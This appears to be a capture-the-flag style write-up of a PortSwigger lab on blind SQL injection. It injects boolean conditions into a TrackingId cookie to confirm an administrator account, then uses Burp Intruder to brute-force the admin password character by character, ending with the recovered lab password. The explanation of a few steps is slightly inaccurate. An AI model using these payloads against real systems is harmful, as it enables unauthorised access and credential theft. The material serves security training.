## Lab Description:

<img width="872" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/a598c10e-2048-4339-a178-895098e40214">

## Solution:

Request looks like

<img width="1424" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/1758de7a-56fb-47f3-beff-957f4204c10a">

Query made looks something like -

```SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'``
where trackingID - RF41TkGpQO3LfVmy Cookievalue - 9q7s4KSbzFFl0VDX4DTcgB81yZw99QJs```

TrackingID parameter is vulnerable. This is a blind SQL injection since response is not diplayed back.

We can perform a SQL injection on trackingID parameter ,

```SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND 1=1-- '```

there maybe 2 results - TrackinID does/does not exist.

Condition(1=1) = TRUE -> Welcome back message is shown

```SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND 1=1-- '```

<img width="1206" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/8b82fc69-9611-4f38-9189-804bf35b3aff">

Condition(1=2) = FALSE -> Welcome back message is not shown

```SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND 1=2-- '```

<img width="1204" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/2ce92fce-012e-42be-a942-acd84280c5dc">

From the above responses, we can we can exploit the blind injection vulnerablitiy .

Conform that there is users table -

```SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'x' FROM users LIMIT 1) = 'x' --```

This SQL statement is checking whether the result of a subquery, which selects the string 'x' from the users table with a limit of 1, is equal to the string 'x'. The use of the AND operator indicates that this condition must be true for the overall query to return any results

If users table  is there, then the condition return x . It checks if returned 'x' = 'x'. Now condition is TRUE. So it conforms that users table is present.

<img width="1437" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/db173a42-05b1-432a-ae57-6503b78f77de">

We see a Welcome back msg , so it conforms that there is a users table.

Conform that username administrator is present in users table -

```SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'a' FROM users WHERE username='administrator')='a```

<img width="1200" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/07909443-b82c-4be1-affe-a8678dcd2fc6">

We confirm that there is a user called administrator in the database.

Find the length password of administrator

```SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a```

In particular, the subquery (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1) is attempting to retrieve the username of the administrator account whose password is longer than one character. If such an account exists in the database, the subquery will return the value "administrator".

The outer part of the string AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator' is then attempting to compare this value to the string literal 'administrator'. If the subquery returns the value 'administrator', then the entire expression will evaluate to true.

<img width="1398" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/c83ae682-b8a9-495b-a8b5-2683dcd548c3">


This confirms that the password is greater than 1

If we send the value as 50 ie ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>50)='a , we dont get any welcome message which means its not > 50 characters.

<img width="1425" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/f3d84b4b-caa2-415d-ad8f-7a399bd80e8a">

Automate this ->

Send request to Intruder
Add the password length part [> 1]
Attack type - SNIPER
Payload type - Numbers
Give number range from 1-50
There is a difference in length at number 20, means that while checking if length(password) > 20 it FAILS.

So the total length of password is 20.

Bruteforce the 20 character length password
Use the same query as above bu thios time we use the SUBSTRING method (SELECT SUBSTRING(password,1,1) to get each letter of the password and loop through it to check if 1st letter is =a/b/c ... & so on.

```SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator' AND LENGTH(password)>1 )='a'--```

From the above command we take the 1st character of the password & check if it is = 'a'. Check until the condition returns TRUE. Meaning the first character of password = letter/number at the right.

Automate this -

Attack type - Cluster bomb
Payload 1 - length checking part [>1]
Payload 2 - character checking part ['a'--]
Payload 1 type - Numbers [range 1-20]
Payload 2 type - Bruteforcer [min & max length = 1]
In the filter settings, add the search item as Welcome
<img width="1209" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/b764a28c-d289-42a6-a623-d60a0d09b396">


<img width="1429" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/d959439b-576b-46ef-a5f7-7f18208097ac">

So password is e6r4su3exp88f6588tcn
<img width="1433" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/423e2b13-3644-4a5b-b467-9c388d45f0c6">




